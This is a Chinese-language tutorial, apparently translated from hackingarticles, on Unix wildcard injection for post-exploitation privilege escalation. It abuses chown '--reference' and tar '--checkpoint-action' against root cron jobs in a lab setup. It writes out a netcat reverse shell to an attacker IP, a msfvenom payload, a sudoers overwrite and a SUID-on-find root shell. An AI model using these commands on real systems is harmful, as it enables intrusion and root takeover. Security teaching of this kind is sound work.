**本文我将为大家介绍一种非常有趣而又古老的UNIX黑客技术“通配符注入”。虽说这已不是什么新技术了，但在后渗透利用中仍可能成为你手中的一把制胜利器。相信阅读本文后，你将会对通配符有更加全面及深入的认识。好了，话不多说让我们开始吧！**

## 通配符

通配符是一种特殊语句，主要有型号（*）和问号（？），用来对字符串进行模糊匹配（比如文件名，参数名）。当查找文件夹时，可以使用它来代替一个或多个真正字符；当不知道真正字符或懒得输入完整名字时，常常使用通配符代替一个或多个真正的字符。

终端里面输入的通配符是由Shell处理的，不是由所涉及到命令语句处理的，它只会出现在命令的“参数值”里（它不用在命令名称里，命令不记得，那就用Tab补全）。当Shell在“参数值”中遇到了通配符时，Shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换（路径扩展）；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。总之，通配符实际上就是一种Shell实现的路径扩展功能。在通配符被处理后，Shell会先完成该命令的重组，然后再继续处理重组后的命令，直至执行该命令。

部分通配符：

 ***** 代表任意多个字符

 **?** 代表任意单个字符

 **[ ]** 代表“[”和“]”之间的某一个字符，比如[0-9]可以代表0-9之间的任意一个数字，[a-zA-Z]可以代表a-z和A-Z之间的任意一个字母，字母区分大小写。

 **–** 代表一个字符。

 **~** 用户的根目录。

### 示例1

首先，我们来创建一个新目录“wild”，并通过echo命令在每个创建的文件中写入一行内容。

    
    
    cd /Desktop
    mkdir wild
    cd wild
    echo "Hello Friends" > file1
    echo "This is wildcard Injection" >file2
    echo "take help" > --help

![1.1.png](https://image.3001.net/images/20180702/15304911198261.png!small)

接着，使用cat命令尝试打开我们所创建的这3个文件：

    
    
    cat file1
    cat file 2
    cat --help

你会发现，前两个文件我们可以正常打开并显示我们所写入的内容。但-help文件中的内容却无法读取，而是从自己的库中调用了自己的-help选项输出，这种技巧被称之为Wildcard wildness（通配符在野）。

##
**![1.2.png](https://image.3001.net/images/20180702/15304911388585.png!small)**

##  **通过Chown劫持文件所有者**

Linux/Unix 是多用户多任务操作系统，所有的文件皆有其拥有者（Owner）。利用 chown命令
可以将文件的拥有者加以改变。一般来说，这个命令只能由系统管理者(root)使用，一般用户没有权限来改变别人的文件的拥有者，也没有权限可以将自己的文件的拥有者改设为别人。只有系统管理者(root)才有这样的权限。

超级管理员用户 (root) - 执行管理级任务，例如执行chown命令。

非root用户1（raj） - 执行普通任务，如创建文件

非root用户2（aarti） - 执行普通任务，如创建文件

恶意用户（Ignite） - 执行可导致文件所有者劫持的Chown文件引用技巧等任务。

在下图中你可以看到，所有PHP文件的所有者均为“raj”用户。此时用户ignite可以在同一目录中执行以下命令，使用文件引用技巧来劫持文件所有者。

 **–reference= <参考文件或目录>：**把指定文件或目录的所有者与所属组，统统设置成和参考文件或目录的所有者与所属组相同。

    
    
    cd
    ls -al
    echo "" > my.php
    echo > --reference=my.php

![1.3.png](https://image.3001.net/images/20180702/15304911589658.png!small)

当root用户使用通配符修改所有PHP文件所有权时，ignite用户将取得所有文件间接所有权。

如果此时root用户执行chown将所有PHP的所有权赋予用户aarti时，将会发生错误,，ignite用户将自动获取所有PHP文件的所有权。

    
    
    chown -R aarti:aarti *.php
    ls -al

如果你对chown的开关选项有深入的了解的话，那么你一定知道下面这个选项。

 **–reference=RFILE** （直接引用某个文件的属性来替换自己的元数据）

在本文的例子中用户ignite执行以下命令：

    
    
    echo "" > my.php
    echo > --reference=my.php

然后，root用户通过通配符来修改文件所有权。chown命令行采用了主观的'-reference =
.my.php'文件，并将其作为选项传递给命令行中的chown命令。

##
**![1.4.png](https://image.3001.net/images/20180702/15304911784153.png!small)**

##  **Tar的后利用技巧（阶段1）**

### Lab-Setup

Tar命令是Linux/Unix中非常常用的一个命令。借助它，我们可以对任何目录进行压缩备份。例如，创建一个新目录并赋予其777权限，然后创建一些文件。

    
    
    mkdir html
    chmod 777 html
    cd html
    touch index.html
    touch raj
    touch file.txt

![1.png](https://image.3001.net/images/20180702/15304912189620.png!small)

现在使用crontab创建一个定时任务，即每隔1分钟从/var/backups里面备份/html一次。

    
    
    nano /etc/crontab
    */1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*

![2.png](https://image.3001.net/images/20180702/15304912384299.png!small)

执行以下命令来验证定时任务是否正常运作。

    
    
    cd /var/backup
    ls

## ![3.png](https://image.3001.net/images/20180702/1530491261992.png!small)

## Tar通配符注入（方法1）

### 提权

启动攻击机并进入至对目标系统的提权阶段。这里假设我通过ssh成功登录到受害者的机器，并以非root用户权限访问其终端。
然后打开crontab查看是否有任何计划任务。

### cat /etc/crontab

可以看到，这些任务都是以root权限执行的。其中有一个和tar有关的并且每分钟执行一次的计划任务，让我们尝试来利用它。

![4.png](https://image.3001.net/images/20180702/15304913116698.png!small)

打开一个新终端，使用msfvenom生成nc反弹一句话，命令如下。

    
    
    msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R

复制payload并将其粘贴至受害者的shell中。

### nc -lvp 8888

 **![5.png](https://image.3001.net/images/20180702/15304913288882.png!small)**

现在粘贴上面复制的payload，并在受害者的tty shell中运行以下命令。

    
    
    echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&amp1 rm /tmp/lhennp" > shell.sh
    echo "" > "--checkpoint-action=exec=sh shell.sh"
    echo "" > --checkpoint=1
    tar cf archive.tar *

![6.png](https://image.3001.net/images/20180702/15304913471415.png!small)

上述命令帮助tar命令在第一个文件归档后运行文件shell.sh。由于在crontab中tar是以root权限运行的，因此将会产生netcat
shell并反弹至攻击机的8888端口。回到侦听端，你将在一分钟后获取到受害者机器的反向连接。

 **id**

 **whoami**

如果你对chown的选项开关有深入的了解的话，那么你一定知道下面这两个选项。

 **–checkpoint[=NUMBER]** 显示每个Numbers记录的进度消息（默认值为10）

 **–checkpoint-action=ACTION** 在每个checkpoint（检查点）上执行ACTION

这里的‘–checkpoint-action’选项，用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。因此，选项‘–checkpoint=1’ 和
‘–checkpoint-action=exec=sh shell.sh’作为命令行选项交给了tar程序。

##
**![7.png](https://image.3001.net/images/20180702/15304913713997.png!small)**

##  **Tar的后利用技巧（阶段2）**

### Lab Setup

这里我将为大家展示多种压缩备份的方法，以及特权提升技术。使用tar命令对目录进行压缩备份，例如，创建一个新目录并赋予其777权限，然后创建一些文件。

    
    
    cd /tmp
    mkdir data
    cd data
    echo "" > f1
    echo "" > f2
    echo "" > f3
    ls

![8.png](https://image.3001.net/images/20180702/15304914004955.png!small)

现在在其他目录中编写一个bash脚本，通过tar命令备份/tmp/data。

    
    
    mkdir info
    cd info
    nano script.sh
    chmod 777 script.sh

![9.png](https://image.3001.net/images/20180702/15304914185590.png!small)

    
    
    #!/bin/bash
    cd /tmp/data
    tar cf /backup/backup.tgz *

![10.png](https://image.3001.net/images/20180702/15304914485431.png!small)

现在在crontab中创建一个计划任务，即每隔1分钟从/var/backups里面备份/html一次。

    
    
    nano /etc/crontab                                   
    */1 *   * * *   root    /info/script.sh

![11.png](https://image.3001.net/images/20180702/15304914753787.png!small)

1分钟后你会发现，backup.tgz文件生成并被保存在了info目录中。

![12.png](https://image.3001.net/images/20180702/15304914967531.png!small)

## Tar通配符注入

### 提权

启动攻击机并进入至对目标系统的提权阶段。这里假设我通过ssh成功登录到受害者的机器，并以非root用户权限访问其终端。
然后打开crontab查看是否有任何计划任务。

### cat /etc/crontab  

可以看到，这些任务都是以root权限执行的，其中有一个每分钟执行一次的bash脚本任务。通过cat命令读取内容后可得知，这里我们可以使用tar通配符注入利用。

![13.png](https://image.3001.net/images/20180702/15304915196611.png!small)

打开一个新终端，使用msfvenom生成nc反弹一句话，命令如下。

![15.png](https://image.3001.net/images/20180702/15304915471658.png!small)

复制payload并将其粘贴至受害者的shell中。

### nc -lvp 8888

现在粘贴上面复制的payload，并在受害者的tty shell中运行以下命令。

![16.png](https://image.3001.net/images/20180702/15304915796738.png!small)

上述命令帮助tar命令在第一个文件归档后运行文件shell.sh。由于在crontab中tar是以root权限运行的，因此将会产生netcat
shell并反弹至攻击机的8888端口。回到侦听端，你将在一分钟后获取到受害者机器的反向连接。

    
    
    whoami
    cd /root
    pwd

##
**![17.png](https://image.3001.net/images/20180702/15304916054525.png!small)**

##  **Tar通配符注入（方法2）**

### 提权

攻击者希望借助通配符注入攻击，获取目标系统的最高访问权限。因此，他们会尝试在tar的帮助下注入一些恶意代码用于root访问。这里有多种获取root访问权限的方法，你可以应用以下技术来提升特权。

尝试通过添加sudoers文件为非root用户授予sudo权限，命令如下。

    
    
    echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh
    echo "" > "--checkpoint-action=exec=sh demo.sh"
    echo "" > --checkpoint=1
    tar cf archive.tar *

在上述命令的帮助下，我们尝试赋予ignite用户root权限，并在1分钟后成功升级为了root权限账户。

    
    
    sudo -l
    sudo bash
    whoami

##
**![18.png](https://image.3001.net/images/20180702/15304916315350.png!small)**

##  **Tar通配符注入（方法3）**

### 提权

我们还可以尝试为任意的系统二进制文件启用SUID位，同样地，你可以再次使用以下命令来获取root访问权限。

    
    
    echo "chmod u+s /usr/bin/find" > test.sh
    echo "" > "--checkpoint-action=exec=sh test.sh"
    echo "" > --checkpoint=1
    tar cf archive.tar *
    ls -al /usr/bin/find
    find f1 -exec "whoami" \;
    root
    find f1 -exec "/bin/sh" \;
    id
    whoami

![19.png](https://image.3001.net/images/20180702/15304916539994.png!small)

除了以上提到的这些方法外，其实还有很多tar注入提权的技巧和方法。希望这篇文章能帮助你打开思路。当然，如果你有更好更巧妙方法的话，也希望你不要吝啬把它分享给我和大家！

**参考：**<https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt>  

*******参考来源：[hackingarticles](http://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)， FB小编 secist 编译，转载请注明来自FreeBuf.COM**

